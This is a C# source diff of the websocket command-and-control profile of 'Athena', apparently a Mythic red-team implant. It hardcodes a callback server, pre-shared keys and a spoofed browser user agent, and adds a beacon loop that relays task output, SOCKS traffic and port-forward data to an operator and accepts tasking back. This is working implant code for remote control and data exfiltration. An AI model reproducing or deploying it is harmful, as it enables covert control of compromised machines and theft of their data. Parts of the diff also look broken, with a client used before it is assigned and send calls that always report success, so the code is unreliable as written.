@@ -11,10 +11,12 @@ using Athena.Commands;
 using Athena.Profiles.Websocket;
 using Athena.Models.Comms.SMB;
 using Athena.Models.Proxy;
+using Websocket.Client;
+using Slack.NetStandard.Messages;
 
 namespace Athena
 {
-    public class Websocket : IProfile
+    public class Websocket : IProfile //Gonna need to fully rewrite this to use events, or add a nuget like Websocket.Client - https://github.com/Marfusios/websocket-client
     {
         public string uuid { get; set; }
         public string psk { get; set; }
@@ -33,48 +35,93 @@ namespace Athena
         public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
         private CancellationTokenSource cts = new CancellationTokenSource();
-        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
+        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
+        private WebsocketClient _client { get; set; }
+
         public Websocket()
         {
             int callbackPort = Int32.Parse("8081");
-            //string callbackHost = "ws://192.168.4.223";
-            string callbackHost = "ws://192.168.4.234";
+            string callbackHost = "ws://192.168.4.248";
             this.endpoint = "socket";
+            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
+            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+            this.hostHeader = "";
+            this.psk = "1OBEx8djwYRtVCbIWn2V+ZSHkWKGrMFF7Vpx6Ce00nU=";
+            this.encryptedExchangeCheck = bool.Parse("false");
+            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
+            this.sleep = sleep;
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "";
-            this.hostHeader = "";
-            this.psk = "KdMlU0mqlqoYHV5sr4yQCfJGO3Uib2uQyMblDKiNdrE=";
-            //this.psk = "lKb443VzmD7L6sjTF+69j8D+I3CphAuS6FPCQAPf/ts=";
-            this.encryptedExchangeCheck = bool.Parse("false");
-            int sleep = int.TryParse("3", out sleep) ? sleep : 60;
-            this.sleep = sleep;
-            int jitter = int.TryParse("3", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.uuid = "eb53d24b-ae9f-4737-b8df-de8df3ed748b";
+            this.uuid = "65728a33-e42a-40e5-971c-7a9e86e5514c";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
 
-            this.ws = new ClientWebSocket();
-
-            if (!String.IsNullOrEmpty(this.hostHeader))
+            var factory = new Func<ClientWebSocket>(() =>
             {
-                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
-            }
+                var client = new ClientWebSocket
+                {
+                    Options =
+                    {
+                        KeepAliveInterval = TimeSpan.FromSeconds(0),
+                        // Proxy = ...
+                        // ClientCertificates = ...
+                    }
+                };
+
+                this._client.ReconnectTimeout = null;
+
+                if (!String.IsNullOrEmpty(this.hostHeader))
+                {
+                    client.Options.SetRequestHeader("Host", this.hostHeader);
+                }
+
+                client.Options.SetRequestHeader("Accept-Type", "Push");
+                //%CUSTOMHEADERS%
+
+                return client;
+            });
+
+
+            this._client = new WebsocketClient(new Uri(this.url), factory);
+            this._client.MessageReceived.Subscribe(msg =>
+            {
+                MessageReceivedArgs mra;
+                WebSocketMessage wm = JsonSerializer.Deserialize<WebSocketMessage>(msg.Text, WebsocketJsonContext.Default.WebSocketMessage);
+
+                if (this.encrypted)
+                {
+                    mra = new MessageReceivedArgs(this.crypt.Decrypt(wm.data));
+                }
+                else
+                {
+                    mra = new MessageReceivedArgs(Misc.Base64Decode(wm.data).Substring(36));
+                }
+
+                Debug.WriteLine($"[{DateTime.Now}] Message Received from Mythic: {mra.message} triggering event.");
+                SetMessageReceived(this, mra);
+            });
+
+
+            this._client.ReconnectionHappened.Subscribe(info =>
+            {
+                Debug.WriteLine($"Reconnection happened, type: {info.Type}, url: {url}");
+            });
+            this._client.DisconnectionHappened.Subscribe(info =>
+                Debug.WriteLine($"Disconnection happened, type: {info.Type}"));
+            //this._client.ReconnectTimeout = TimeSpan.Zero;
+            //this._client.ErrorReconnectTimeout = TimeSpan.Zero;
+            this._client.Start().Wait();
         }
         public async Task StartBeacon()
         {
             this.cts = new CancellationTokenSource();
             while (!cts.Token.IsCancellationRequested)
             {
-                if (this.currentAttempt > this.maxAttempts)
-                {
-                    Environment.Exit(0);
-                }
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
@@ -82,9 +129,18 @@ namespace Athena
                 Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                 await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
+                //If we don't have anything to return, continue the loop.
+                if (delegateTask.Result.Count <= 0 &&
+                    socksTask.Result.Count <= 0 &&
+                    responseTask.Result.Count <= 0 &&
+                    rpFwdTask.Result.Count <= 0)
+                {
+                    continue;
+                }
+
                 GetTasking gt = new GetTasking()
                 {
-                    action = "get_tasking",
+                    action = "post_response",
                     tasking_size = -1,
                     delegates = delegateTask.Result,
                     socks = socksTask.Result,
@@ -93,26 +149,7 @@ namespace Athena
                 };
                 try
                 {
-                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
-
-                    if (String.IsNullOrEmpty(responseString))
-                    {
-                        this.currentAttempt++;
-                        continue;
-                    }
-
-                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    if (gtr == null)
-                    {
-                        this.currentAttempt++;
-                        continue;
-                    }
-
-                    this.currentAttempt = 0;
-
-                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-
-                    this.SetTaskingReceived(this, tra);
+                    await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
                 }
                 catch (Exception e)
                 {
@@ -123,6 +160,8 @@ namespace Athena
                 if (this.currentAttempt >= this.maxAttempts)
                 {
                     this.cts.Cancel();
+                    await this._client.Stop(WebSocketCloseStatus.EndpointUnavailable, "Exiting");
+                    this._client.Dispose();
                 }
             }
         }
@@ -131,143 +170,57 @@ namespace Athena
             this.cts.Cancel();
             return true;
         }
-        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        public async Task<bool> Checkin(Checkin checkin)
         {
             int maxAttempts = 3;
             int currentAttempt = 0;
             do
             {
-                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
-
-                if (!string.IsNullOrEmpty(res))
+                Debug.WriteLine("Sending.");
+                if(await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                 {
-                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                    break;
                 }
+
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
 
-            return new CheckinResponse()
-            {
-                status = "failed"
-            };
+            return true;
         }
-        public async Task<bool> Connect(string url)
+        public async Task<bool> Send(string json)
         {
-            this.connectAttempts = 0;
             try
             {
-                ws = new ClientWebSocket();
-                await ws.ConnectAsync(new Uri(url), CancellationToken.None);
-
-                while (ws.State != WebSocketState.Open)
+                if (this._client.IsRunning)
                 {
-                    if (this.connectAttempts == this.maxAttempts)
+                    if (this.encrypted)
                     {
-                        Environment.Exit(0);
+                        json = this.crypt.Encrypt(json);
                     }
-                    await Task.Delay(3000);
-                    this.connectAttempts++;
+                    else
+                    {
+                        json = await Misc.Base64Encode(this.uuid + json);
+                    }
+
+                    WebSocketMessage m = new WebSocketMessage()
+                    {
+                        client = true,
+                        data = json,
+                        tag = String.Empty
+                    };
+
+                    string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
+                    //byte[] msg = Encoding.UTF8.GetBytes(message);
+
+                    this._client.Send(message);
                 }
-                return true;
             }
             catch
             {
                 return false;
             }
-        }
-        public async Task<string> Send(string json)
-        {
-            if (this.ws.State != WebSocketState.Open)
-            {
-                Debug.WriteLine($"[{DateTime.Now}] Lost socket connection, attempting to re-establish.");
-                await Connect(this.url);
-            }
 
-            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
-
-            try
-            {
-                if (this.encrypted)
-                {
-                    json = this.crypt.Encrypt(json);
-                }
-                else
-                {
-                    json = await Misc.Base64Encode(this.uuid + json);
-                }
-
-                WebSocketMessage m = new WebSocketMessage()
-                {
-                    client = true,
-                    data = json,
-                    tag = String.Empty
-                };
-
-                string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
-                byte[] msg = Encoding.UTF8.GetBytes(message);
-                Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
-                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
-                message = await Receive(ws);
-
-                if (String.IsNullOrEmpty(message))
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Response was empty.");
-                    return String.Empty;
-                }
-
-                m = JsonSerializer.Deserialize<WebSocketMessage>(message, WebsocketJsonContext.Default.WebSocketMessage);
-
-                if (this.encrypted)
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(m.data)}");
-                    return this.crypt.Decrypt(m.data);
-                }
-
-                if (!string.IsNullOrEmpty(json))
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(m.data).Result.Substring(36)}");
-                    return (await Misc.Base64Decode(m.data)).Substring(36);
-                }
-
-                return String.Empty;
-            }
-            catch
-            {
-                return String.Empty;
-            }
-        }
-        static async Task<string> Receive(ClientWebSocket socket)
-        {
-            try
-            {
-                var buffer = new ArraySegment<byte>(new byte[2048]);
-                do
-                {
-                    WebSocketReceiveResult result;
-                    using (var ms = new MemoryStream())
-                    {
-                        do
-                        {
-                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
-                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
-                        } while (!result.EndOfMessage);
-
-                        if (result.MessageType == WebSocketMessageType.Close)
-                            break;
-
-                        ms.Seek(0, SeekOrigin.Begin);
-                        using (var reader = new StreamReader(ms, Encoding.UTF8))
-                            return (await reader.ReadToEndAsync());
-                    }
-
-                } while (true);
-
-                return String.Empty;
-            }
-            catch
-            {
-                return String.Empty;
-            }
+            return true;
         }
     }
 }
